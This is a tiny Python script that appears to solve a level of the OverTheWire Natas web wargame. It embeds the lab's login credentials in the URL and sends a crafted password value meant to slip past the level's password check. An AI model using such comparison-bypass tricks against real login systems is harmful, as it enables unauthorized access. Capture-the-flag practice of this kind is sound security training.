import requests

target = 'http://natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE@natas23.natas.labs.overthewire.org?passwd=11iloveyou'
r = requests.get(target)
print r.text